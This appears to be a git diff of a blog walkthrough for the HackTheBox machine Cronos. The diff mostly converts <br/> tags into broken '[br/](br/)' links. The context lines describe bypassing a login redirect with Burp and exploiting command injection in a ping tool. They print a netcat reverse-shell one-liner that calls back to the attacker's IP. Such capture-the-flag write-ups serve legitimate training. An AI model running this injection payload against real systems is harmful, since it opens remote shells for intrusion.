@@ -10,7 +10,7 @@ categories: HackTheBox OSCP-Like
 
 We are going to pwn Cronos from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/11>
+Link : [https://www.hackthebox.eu/home/machines/profile/11](https://www.hackthebox.eu/home/machines/profile/11)
 
 
 Like always begin with our Nmap Scan.
@@ -99,22 +99,22 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 ## Getting Initial Shell
 
-When I try to enter ``/welcome.php`` it redirects to ``/login.php`` , So we can stop the redirection and see what that page leads us.<br/>
-We can use ``intruder`` from burp to do this process.<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/5.png)<br/>
+When I try to enter ``/welcome.php`` it redirects to ``/login.php`` , So we can stop the redirection and see what that page leads us.[br/](br/)
+We can use ``intruder`` from burp to do this process.[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/5.png)[br/](br/)
 All we need to do is change ``302 Found`` to ``200 Ok``.
 
-For that open ``Proxy -> Options -> Match and Replace``<br/>
+For that open ``Proxy -> Options -> Match and Replace``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/6.png)
 
-``/welcome.php`` it leads to a page where it has a tool to ping.<br/>
+``/welcome.php`` it leads to a page where it has a tool to ping.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/7.png)
 
 So I tried some normal command injections and  ``&&`` helps to exec another commands.
 
 `` 10.10.14.8 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f ``
 
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/8.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-cronos/8.png)[br/](br/)
 We got the shell
 
 While checking for any useful files in ``/var/www`` found ``/admin.php/config.php``  and its give me ``mysql`` credentials
